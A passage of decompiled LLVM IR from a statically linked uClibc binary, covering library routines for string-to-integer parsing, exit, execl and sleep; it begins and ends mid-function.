  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8053d2a = icmp eq i1 %v10_8053d22, %v8_8053d22
  %v5_8053d2a = select i1 %v2_8053d2a, i32 16, i32 %v3_8053d2a
  store i32 %v5_8053d2a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053d2d

dec_label_pc_8053d2d:                             ; preds = %dec_label_pc_8053cff, %dec_label_pc_8053d22
  %v0_8053da423 = phi i32 [ %v4_8053cc7, %dec_label_pc_8053cff ], [ %v0_8053da422, %dec_label_pc_8053d22 ]
  %v0_8053d4a12 = phi i32 [ %v0_8053d11, %dec_label_pc_8053cff ], [ %v0_8053d4a13, %dec_label_pc_8053d22 ]
  %v0_8053d3c = phi i32 [ %arg3, %dec_label_pc_8053cff ], [ %v5_8053d2a, %dec_label_pc_8053d22 ]
  %v1_8053d2d = add i32 %v0_8053d3c, -2
  store i32 %v1_8053d2d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053d35 = icmp ugt i32 %v1_8053d2d, 34
  br i1 %v6_8053d35, label %dec_label_pc_8053d99, label %dec_label_pc_8053d37

dec_label_pc_8053d37:                             ; preds = %dec_label_pc_8053d2d
  %div = udiv i32 -1, %v0_8053d3c
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8053d3c
  %v1_8053d3e = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053d77 = urem i32 %arg4, 256
  br label %dec_label_pc_8053d4a

dec_label_pc_8053d48:                             ; preds = %dec_label_pc_8053d8f, %dec_label_pc_8053d77
  %v2_8053d4c.pre = phi i32 [ %v0_8053d92, %dec_label_pc_8053d8f ], [ %v2_8053d4c.pre.pre, %dec_label_pc_8053d77 ]
  %v4_8053d4a.pre = phi i32 [ %v1_8053d63, %dec_label_pc_8053d8f ], [ %v4_8053d4a.pre.pre, %dec_label_pc_8053d77 ]
  %v0_8053d48 = phi i32 [ %v1_8053d6a, %dec_label_pc_8053d8f ], [ %v0_8053d48.pre, %dec_label_pc_8053d77 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8053d8f ], [ %v6_8053d7b, %dec_label_pc_8053d77 ]
  br label %dec_label_pc_8053d4a

dec_label_pc_8053d4a:                             ; preds = %dec_label_pc_8053d37, %dec_label_pc_8053d48
  %v0_8053da421 = phi i32 [ %v0_8053da423, %dec_label_pc_8053d37 ], [ %v0_8053d48, %dec_label_pc_8053d48 ]
  %v0_8053d6a = phi i32 [ %v0_8053d4a12, %dec_label_pc_8053d37 ], [ %v0_8053d48, %dec_label_pc_8053d48 ]
  %v2_8053d4c = phi i32 [ %v4_8053cc7, %dec_label_pc_8053d37 ], [ %v2_8053d4c.pre, %dec_label_pc_8053d48 ]
  %v4_8053d4a = phi i32 [ %div, %dec_label_pc_8053d37 ], [ %v4_8053d4a.pre, %dec_label_pc_8053d48 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8053d37 ], [ %stack_var_-18.1, %dec_label_pc_8053d48 ]
  %v1_8053d4a = inttoptr i32 %v0_8053d6a to i8*
  %v2_8053d4a = load i8, i8* %v1_8053d4a, align 1
  %v3_8053d4a = zext i8 %v2_8053d4a to i32
  %v5_8053d4a = and i32 %v4_8053d4a, -256
  %v6_8053d4a = or i32 %v3_8053d4a, %v5_8053d4a
  store i32 %v6_8053d4a, i32* %eax.global-to-local, align 4
  %v2_8053d4e = add i8 %v2_8053d4a, -48
  %v12_8053d4e = zext i8 %v2_8053d4e to i32
  %v14_8053d4e = and i32 %v2_8053d4c, -256
  %v15_8053d4e = or i32 %v12_8053d4e, %v14_8053d4e
  store i32 %v15_8053d4e, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8053d4e, 10
  br i1 %tmp, label %dec_label_pc_8053d63, label %dec_label_pc_8053d56

dec_label_pc_8053d56:                             ; preds = %dec_label_pc_8053d4a
  %v2_8053d56 = or i8 %v2_8053d4a, 32
  %v7_8053d56 = zext i8 %v2_8053d56 to i32
  %v10_8053d56 = or i32 %v7_8053d56, %v5_8053d4a
  store i32 %v10_8053d56, i32* %eax.global-to-local, align 4
  %v2_8053d58 = or i32 %v14_8053d4e, 40
  store i32 %v2_8053d58, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_8053d56, 97
  br i1 %tmp55, label %dec_label_pc_8053d63, label %dec_label_pc_8053d5e

dec_label_pc_8053d5e:                             ; preds = %dec_label_pc_8053d56
  %v2_8053d60 = add i8 %v2_8053d56, -87
  %v15_8053d60 = zext i8 %v2_8053d60 to i32
  %v18_8053d60 = or i32 %v15_8053d60, %v14_8053d4e
  store i32 %v18_8053d60, i32* @ecx, align 4
  br label %dec_label_pc_8053d63

dec_label_pc_8053d63:                             ; preds = %dec_label_pc_8053d56, %dec_label_pc_8053d4a, %dec_label_pc_8053d5e
  %v0_8053d92 = phi i32 [ %v2_8053d58, %dec_label_pc_8053d56 ], [ %v15_8053d4e, %dec_label_pc_8053d4a ], [ %v18_8053d60, %dec_label_pc_8053d5e ]
  %v1_8053d63 = urem i32 %v0_8053d92, 256
  store i32 %v1_8053d63, i32* %eax.global-to-local, align 4
  %v1_8053d66 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053d66 = sub i32 %v1_8053d63, %v1_8053d66
  %v10_8053d66 = and i32 %v2_8053d66, %v1_8053d66
  %v11_8053d66 = icmp slt i32 %v10_8053d66, 0
  %v13_8053d66 = icmp slt i32 %v2_8053d66, 0
  %v2_8053d68 = icmp eq i1 %v13_8053d66, %v11_8053d66
  br i1 %v2_8053d68, label %dec_label_pc_8053d99, label %dec_label_pc_8053d6a

dec_label_pc_8053d6a:                             ; preds = %dec_label_pc_8053d63
  %v1_8053d6a = add i32 %v0_8053d6a, 1
  store i32 %v1_8053d6a, i32* %ebx.global-to-local, align 4
  %v0_8053d6b = load i32, i32* %edx.global-to-local, align 4
  %v1_8053d6b = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8053d6b, %v1_8053d6b
  br i1 %tmp56, label %dec_label_pc_8053d77, label %dec_label_pc_8053d6f

dec_label_pc_8053d6f:                             ; preds = %dec_label_pc_8053d6a
  %v12_8053d6b = icmp eq i32 %v0_8053d6b, %v1_8053d6b
  %v1_8053d6f = icmp eq i1 %v12_8053d6b, false
  br i1 %v1_8053d6f, label %dec_label_pc_8053d8f, label %dec_label_pc_8053d71

dec_label_pc_8053d71:                             ; preds = %dec_label_pc_8053d6f
  %v1_8053d71 = trunc i32 %v0_8053d92 to i8
  %tmp57 = icmp ugt i8 %v1_8053d71, %v1_8053d3e
  br i1 %tmp57, label %dec_label_pc_8053d77, label %dec_label_pc_8053d8f

dec_label_pc_8053d77:                             ; preds = %dec_label_pc_8053d71, %dec_label_pc_8053d6a
  store i32 %v4_8053d77, i32* %eax.global-to-local, align 4
  %v6_8053d7b = and i8 %stack_var_-18.2, %tmp37
  %v1_8053d7f = sext i8 %v6_8053d7b to i32
  %v2_8053d7f = call i32 @__errno_location(i32 %v1_8053d7f)
  store i32 %v2_8053d7f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053d87 = inttoptr i32 %v2_8053d7f to i32*
  store i32 34, i32* %v1_8053d87, align 4
  %v0_8053d48.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053d4a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8053d4c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053d48

dec_label_pc_8053d8f:                             ; preds = %dec_label_pc_8053d71, %dec_label_pc_8053d6f
  %v4_8053d8f = mul i32 %v0_8053d6b, %v1_8053d66
  store i32 %v1_8053d63, i32* %eax.global-to-local, align 4
  %v2_8053d95 = add i32 %v4_8053d8f, %v1_8053d63
  store i32 %v2_8053d95, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053d48

dec_label_pc_8053d99:                             ; preds = %dec_label_pc_8053d63, %dec_label_pc_8053d2d
  %v0_8053da4 = phi i32 [ %v0_8053da423, %dec_label_pc_8053d2d ], [ %v0_8053da421, %dec_label_pc_8053d63 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8053d2d ], [ %stack_var_-18.2, %dec_label_pc_8053d63 ]
  %v4_8053d99 = icmp eq i32 %arg2, 0
  br i1 %v4_8053d99, label %dec_label_pc_8053da6, label %dec_label_pc_8053da0

dec_label_pc_8053da0:                             ; preds = %dec_label_pc_8053d99
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053da4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053da4, i32* %v2_8053da4, align 4
  br label %dec_label_pc_8053da6

dec_label_pc_8053da6:                             ; preds = %dec_label_pc_8053d99, %dec_label_pc_8053da0
  %v8_8053da6 = icmp eq i8 %stack_var_-18.3, 0
  %v2_8053dab = zext i1 %v8_8053da6 to i32
  %v13_8053dab = icmp eq i1 %v8_8053da6, false
  %v1_8053dad3 = or i32 %v2_8053dab, -2147483648
  store i32 %v1_8053dad3, i32* %ebx.global-to-local, align 4
  %v5_8053db3 = icmp eq i8 %tmp37, 0
  br i1 %v5_8053db3, label %dec_label_pc_8053dcb, label %dec_label_pc_8053dba

dec_label_pc_8053dba:                             ; preds = %dec_label_pc_8053da6
  %v0_8053dba = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_8053dba, %v1_8053dad3
  br i1 %tmp58, label %dec_label_pc_8053dbe, label %dec_label_pc_8053dcb

dec_label_pc_8053dbe:                             ; preds = %dec_label_pc_8053dba
  %v1_8053dbe = sext i8 %stack_var_-18.3 to i32
  %v2_8053dbe = call i32 @__errno_location(i32 %v1_8053dbe)
  store i32 %v2_8053dbe, i32* %eax.global-to-local, align 4
  %v0_8053dc3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053dc3, i32* %edx.global-to-local, align 4
  %v1_8053dc5 = inttoptr i32 %v2_8053dbe to i32*
  store i32 34, i32* %v1_8053dc5, align 4
  br label %dec_label_pc_8053dcb

dec_label_pc_8053dcb:                             ; preds = %dec_label_pc_8053dba, %dec_label_pc_8053da6, %dec_label_pc_8053dbe
  %v0_8053dcb = load i32, i32* %edx.global-to-local, align 4
  %v1_8053dcd = sub i32 0, %v0_8053dcb
  %v4_8053dd4 = select i1 %v13_8053dab, i32 %v1_8053dcd, i32 %v0_8053dcb
  store i32 %v4_8053dd4, i32* @edx, align 4
  %v2_8053dda = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053dda, i32* @ebx, align 4
  store i32 %v4_8053dd4, i32* %eax.global-to-local, align 4
  ret i32 %v4_8053dd4

; uselistorder directives
  uselistorder i32 %v4_8053dd4, { 1, 0, 2 }
  uselistorder i1 %v8_8053da6, { 1, 0 }
  uselistorder i8 %v6_8053d7b, { 1, 0 }
  uselistorder i32 %v1_8053d6b, { 1, 0 }
  uselistorder i32 %v0_8053d6b, { 2, 1, 0 }
  uselistorder i32 %v1_8053d6a, { 1, 0 }
  uselistorder i32 %v2_8053d66, { 1, 0 }
  uselistorder i32 %v1_8053d63, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053d92, { 2, 0, 1 }
  uselistorder i8 %v2_8053d56, { 1, 0, 2 }
  uselistorder i32 %v14_8053d4e, { 0, 2, 1 }
  uselistorder i32 %v0_8053d48, { 1, 0 }
  uselistorder i32 %v0_8053d3c, { 1, 0, 2 }
  uselistorder i32 %v3_8053d2a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8053d1f, { 1, 0 }
  uselistorder i32 %v1_8053d12, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8053d11, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_8053cda.lcssa, { 1, 0 }
  uselistorder i32 %v0_8053cd9.lcssa, { 1, 0 }
  uselistorder i32 %v1_8053cd9, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8053ccf, { 1, 0, 2 }
  uselistorder i32 %v4_8053cc7, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053dcb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053da6, { 1, 0 }
  uselistorder label %dec_label_pc_8053d63, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8053d2d, { 1, 0 }
  uselistorder label %dec_label_pc_8053d22, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cff, { 1, 0 }
  uselistorder label %dec_label_pc_8053cfe, { 1, 0 }
  uselistorder label %dec_label_pc_8053cd9, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053df7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053df7, i32* @ebx, align 4
  %v2_8053dfc = call i32 @__pthread_return_void(i32 %v2_8053df7, i32 134562299)
  %v1_8053e08 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062520.763 to i32))
  %v0_8053e0d = load i32, i32* @global_var_80687c4.764, align 4
  store i32 %v0_8053e0d, i32* @eax, align 4
  %v1_8053e15 = icmp eq i32 %v0_8053e0d, 0
  br i1 %v1_8053e15, label %dec_label_pc_8053e22, label %dec_label_pc_8053e19

dec_label_pc_8053e19:                             ; preds = %entry
  %v0_8053e1c = load i32, i32* @esi, align 4
  %v1_8053e1d = call i32 @unknown_0(i32 %v0_8053e1c)
  store i32 %v1_8053e1d, i32* @eax, align 4
  br label %dec_label_pc_8053e22

dec_label_pc_8053e22:                             ; preds = %entry, %dec_label_pc_8053e19
  %v2_8053e27 = call i32 @__pthread_return_void(i32 %v2_8053df7, i32 1)
  %v0_8053e2c = call i32 @__GI___uClibc_fini()
  %v0_8053e3d = call i32 @_stdio_term()
  %v0_8053e45 = load i32, i32* @esi, align 4
  %v1_8053e46 = call i32 @__GI__exit(i32 %v0_8053e45)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 4, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_8053e22, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8053e52 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e52, i32* %stack_var_-12, align 4
  %v2_8053e53 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053e53, i32* %eax.global-to-local, align 4
  %v12_8053e56 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053e5c

dec_label_pc_8053e5c:                             ; preds = %dec_label_pc_8053e5c, %entry
  %v0_8053e5f = phi i32 [ 0, %entry ], [ %v1_8053e5f, %dec_label_pc_8053e5c ]
  %stack_var_-16.0 = phi i32 [ %v2_8053e53, %entry ], [ %v1_8053e60, %dec_label_pc_8053e5c ]
  %v1_8053e5f = add i32 %v0_8053e5f, 1
  store i32 %v1_8053e5f, i32* %esi.global-to-local, align 4
  %v1_8053e60 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053e60, i32* %eax.global-to-local, align 4
  %v1_8053e66 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053e66 = load i32, i32* %v1_8053e66, align 4
  %v3_8053e66 = icmp eq i32 %v2_8053e66, 0
  %v1_8053e69 = icmp eq i1 %v3_8053e66, false
  br i1 %v1_8053e69, label %dec_label_pc_8053e5c, label %dec_label_pc_8053e6b

dec_label_pc_8053e6b:                             ; preds = %dec_label_pc_8053e5c
  %v1_8053e6b = mul i32 %v1_8053e5f, 4
  %v2_8053e6b = add i32 %v1_8053e6b, 34
  %v1_8053e72 = and i32 %v2_8053e6b, -16
  %v2_8053e75 = sub i32 %v12_8053e56, %v1_8053e72
  %v1_8053e7a = add i32 %v2_8053e75, 15
  %v1_8053e7e = and i32 %v1_8053e7a, -16
  store i32 %v1_8053e7e, i32* @ebx, align 4
  store i32 %v1_8053e7e, i32* %ecx.global-to-local, align 4
  %v2_8053e83 = inttoptr i32 %v1_8053e7e to i32*
  store i32 %arg2, i32* %v2_8053e83, align 16
  store i32 %v2_8053e53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e8b

dec_label_pc_8053e8b:                             ; preds = %dec_label_pc_8053e8b, %dec_label_pc_8053e6b
  %stack_var_-16.1 = phi i32 [ %v2_8053e53, %dec_label_pc_8053e6b ], [ %v1_8053e92, %dec_label_pc_8053e8b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053e8e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053e8e = add i32 %v0_8053e8e, 4
  store i32 %v1_8053e8e, i32* %ecx.global-to-local, align 4
  %v0_8053e91 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053e91 = add i32 %v0_8053e91, -1
  %v8_8053e91 = icmp eq i32 %v1_8053e91, 0
  store i32 %v1_8053e91, i32* %esi.global-to-local, align 4
  %v1_8053e92 = add i32 %stack_var_-16.1, 4
  %v1_8053e98 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8053e98 = load i32, i32* %v1_8053e98, align 4
  store i32 %v2_8053e98, i32* %eax.global-to-local, align 4
  %v2_8053e9a = inttoptr i32 %v1_8053e8e to i32*
  store i32 %v2_8053e98, i32* %v2_8053e9a, align 4
  %v1_8053e9c = icmp eq i1 %v8_8053e91, false
  br i1 %v1_8053e9c, label %dec_label_pc_8053e8b, label %dec_label_pc_8053e9e

dec_label_pc_8053e9e:                             ; preds = %dec_label_pc_8053e8b
  %v0_8053e9e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e9e = load i32, i32* @esp, align 4
  %v2_8053e9e = add i32 %v1_8053e9e, -4
  %v3_8053e9e = inttoptr i32 %v2_8053e9e to i32*
  store i32 %v0_8053e9e, i32* %v3_8053e9e, align 4
  %v0_8053e9f = load i32, i32* @global_var_80687cc.765, align 4
  %v2_8053e9f = add i32 %v1_8053e9e, -8
  %v3_8053e9f = inttoptr i32 %v2_8053e9f to i32*
  store i32 %v0_8053e9f, i32* %v3_8053e9f, align 4
  %v0_8053ea5 = load i32, i32* @ebx, align 4
  %v2_8053ea5 = add i32 %v1_8053e9e, -12
  %v3_8053ea5 = inttoptr i32 %v2_8053ea5 to i32*
  store i32 %v0_8053ea5, i32* %v3_8053ea5, align 4
  %v5_8053ea6 = add i32 %v1_8053e9e, -16
  %v6_8053ea6 = inttoptr i32 %v5_8053ea6 to i32*
  store i32 %arg1, i32* %v6_8053ea6, align 4
  %v1_8053ea9 = inttoptr i32 %v1_8053e92 to i8*
  %v2_8053ea9 = call i32 @__GI_execve(i8* %v1_8053ea9)
  store i32 %v2_8053ea9, i32* %eax.global-to-local, align 4
  %v2_8053eb1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053eb1, i32* @ebx, align 4
  ret i32 %v2_8053ea9

; uselistorder directives
  uselistorder i32 %v1_8053e91, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053e60, { 1, 0 }
  uselistorder i32 %v1_8053e5f, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053e53, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8053ebe = load i32, i32* @edi, align 4
  %v0_8053ebf = load i32, i32* @esi, align 4
  %v0_8053ec0 = load i32, i32* @ebx, align 4
  %v15_8053ec1 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_8053ece = icmp eq i32 %arg1, 0
  %v1_8053ed0 = icmp eq i1 %v1_8053ece, false
  br i1 %v1_8053ed0, label %dec_label_pc_8053ee2.preheader, label %dec_label_pc_805402f

dec_label_pc_8053ee2.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ed7

dec_label_pc_8053ed7:                             ; preds = %dec_label_pc_8053ed7.dec_label_pc_8053ed7_crit_edge, %dec_label_pc_8053ee2.preheader
  %v0_8053ed7 = phi i32 [ %v15_8053ec1, %dec_label_pc_8053ee2.preheader ], [ %v0_8053ed7.pre, %dec_label_pc_8053ed7.dec_label_pc_8053ed7_crit_edge ]
  %v1_8053ee227 = phi i32 [ 31, %dec_label_pc_8053ee2.preheader ], [ %v1_8053ee2, %dec_label_pc_8053ed7.dec_label_pc_8053ed7_crit_edge ]
  %v2_8053ed7 = mul i32 %v1_8053ee227, 4
  %v3_8053ed7 = add i32 %v2_8053ed7, 292
  %v4_8053ed7 = add i32 %v3_8053ed7, %v0_8053ed7
  %v5_8053ed7 = inttoptr i32 %v4_8053ed7 to i32*
  store i32 0, i32* %v5_8053ed7, align 4
  %v0_8053ee2.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ee2 = add i32 %v0_8053ee2.pre, -1
  %v9_8053ee2 = icmp slt i32 %v1_8053ee2, 0
  store i32 %v1_8053ee2, i32* %eax.global-to-local, align 4
  %v1_8053ee3 = icmp eq i1 %v9_8053ee2, false
  br i1 %v1_8053ee3, label %dec_label_pc_8053ed7.dec_label_pc_8053ed7_crit_edge, label %dec_label_pc_8053ee5

dec_label_pc_8053ed7.dec_label_pc_8053ed7_crit_edge: ; preds = %dec_label_pc_8053ed7
  %v0_8053ed7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053ed7

dec_label_pc_8053ee5:                             ; preds = %dec_label_pc_8053ed7
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053efb = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053efb, i32* @ebx, align 4
  store i32 %v2_8053efb, i32* %stack_var_-460, align 4
  %v4_8053f03 = call i32 @__sigaddset(i32 %v2_8053efb, i32 17, i32 %v1_8053ee2, i32 %v1_8053ee2)
  store i32 %v4_8053f03, i32* %eax.global-to-local, align 4
  %v2_8053f0b = icmp slt i32 %v4_8053f03, 0
  br i1 %v2_8053f0b, label %dec_label_pc_8054033, label %dec_label_pc_8053f13

dec_label_pc_8053f13:                             ; preds = %dec_label_pc_8053ee5
  %v2_8053f14 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053f14, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053f1f = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053f1f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8053f1f, i32 %v2_8053f14)
  store i32 %v4_8053f1f, i32* %eax.global-to-local, align 4
  %v1_8053f27 = icmp eq i32 %v4_8053f1f, 0
  %v1_8053f29 = icmp eq i1 %v1_8053f27, false
  br i1 %v1_8053f29, label %dec_label_pc_8054033, label %dec_label_pc_8053f2f

dec_label_pc_8053f2f:                             ; preds = %dec_label_pc_8053f13
  store i32 %v2_8053f14, i32* %stack_var_-460, align 4
  %v4_8053f34 = call i32 @__sigismember(i32 %v2_8053f14, i32 17, i32 %v4_8053f1f, i32 %v4_8053f1f)
  store i32 %v4_8053f34, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053f41 = icmp eq i32 %v4_8053f34, 0
  br i1 %v1_8053f41, label %dec_label_pc_8053f55.preheader, label %dec_label_pc_8053ffd

dec_label_pc_8053f55.preheader:                   ; preds = %dec_label_pc_8053f2f
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053f4a

dec_label_pc_8053f4a:                             ; preds = %dec_label_pc_8053f4a.dec_label_pc_8053f4a_crit_edge, %dec_label_pc_8053f55.preheader
  %v0_8053f4a = phi i32 [ %v15_8053ec1, %dec_label_pc_8053f55.preheader ], [ %v0_8053f4a.pre, %dec_label_pc_8053f4a.dec_label_pc_8053f4a_crit_edge ]
  %v1_8053f5526 = phi i32 [ 31, %dec_label_pc_8053f55.preheader ], [ %v1_8053f55, %dec_label_pc_8053f4a.dec_label_pc_8053f4a_crit_edge ]
  %v2_8053f4a = mul i32 %v1_8053f5526, 4
  %v3_8053f4a = add i32 %v2_8053f4a, 292
  %v4_8053f4a = add i32 %v3_8053f4a, %v0_8053f4a
  %v5_8053f4a = inttoptr i32 %v4_8053f4a to i32*
  store i32 0, i32* %v5_8053f4a, align 4
  %v0_8053f55.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f55 = add i32 %v0_8053f55.pre, -1
  %v9_8053f55 = icmp slt i32 %v1_8053f55, 0
  store i32 %v1_8053f55, i32* %edx.global-to-local, align 4
  %v1_8053f56 = icmp eq i1 %v9_8053f55, false
  br i1 %v1_8053f56, label %dec_label_pc_8053f4a.dec_label_pc_8053f4a_crit_edge, label %dec_label_pc_8053f58

dec_label_pc_8053f4a.dec_label_pc_8053f4a_crit_edge: ; preds = %dec_label_pc_8053f4a
  %v0_8053f4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053f4a

dec_label_pc_8053f58:                             ; preds = %dec_label_pc_8053f4a
  store i32 %v2_8053efb, i32* %eax.global-to-local, align 4
  store i32 %v2_8053efb, i32* %stack_var_-460, align 4
  %v4_8053f64 = call i32 @__sigaddset(i32 %v2_8053efb, i32 17, i32 0, i32 0)
  store i32 %v4_8053f64, i32* %eax.global-to-local, align 4
  %v2_8053f6c = icmp slt i32 %v4_8053f64, 0
  br i1 %v2_8053f6c, label %dec_label_pc_8054033, label %dec_label_pc_8053f74

dec_label_pc_8053f74:                             ; preds = %dec_label_pc_8053f58
  %v2_8053f75 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053f75, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053f7e = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8053f75)
  store i32 %v4_8053f7e, i32* %eax.global-to-local, align 4
  %v2_8053f86 = icmp slt i32 %v4_8053f7e, 0
  %v1_8053f88 = icmp eq i1 %v2_8053f86, false
  br i1 %v1_8053f88, label %dec_label_pc_8053fb2, label %dec_label_pc_8053f8a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053f74
  %v0_8053f8a = load i32, i32* %stack_var_-460, align 4
  %v1_8053f8a = call i32 @__errno_location(i32 %v0_8053f8a)
  store i32 %v1_8053f8a, i32* %eax.global-to-local, align 4
  %v1_8053f8f = inttoptr i32 %v1_8053f8a to i32*
  %v2_8053f8f = load i32, i32* %v1_8053f8f, align 4
  store i32 %v2_8053f8f, i32* @esi, align 4
  store i32 %v1_8053f8a, i32* @ebx, align 4
  store i32 %v2_8053f14, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053fa0 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053fa0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053fa0, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053fab = load i32, i32* @esi, align 4
  %v1_8053fab = load i32, i32* @ebx, align 4
  %v2_8053fab = inttoptr i32 %v1_8053fab to i32*
  store i32 %v0_8053fab, i32* %v2_8053fab, align 4
  %v0_8054040.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054036

dec_label_pc_8053fb2:                             ; preds = %dec_label_pc_8053f74
  %v3_8053fb2 = load i32, i32* %stack_var_-420, align 4
  %v12_8053fb2 = icmp eq i32 %v3_8053fb2, 1
  %v2_8053fbe = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053fbe, i32* @ebx, align 4
  %v1_8053fc5 = icmp eq i1 %v12_8053fb2, false
  br i1 %v1_8053fc5, label %dec_label_pc_8053fec, label %dec_label_pc_8053fc7

dec_label_pc_8053fc7:                             ; preds = %dec_label_pc_8053fb2
  store i32 %v2_8053fbe, i32* %stack_var_-460, align 4
  %v2_8053fcb = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8053fcb = call i32 @__libc_nanosleep(%timespec* %v2_8053fcb, i32 %v2_8053fbe)
  store i32 %v3_8053fcb, i32* %eax.global-to-local, align 4
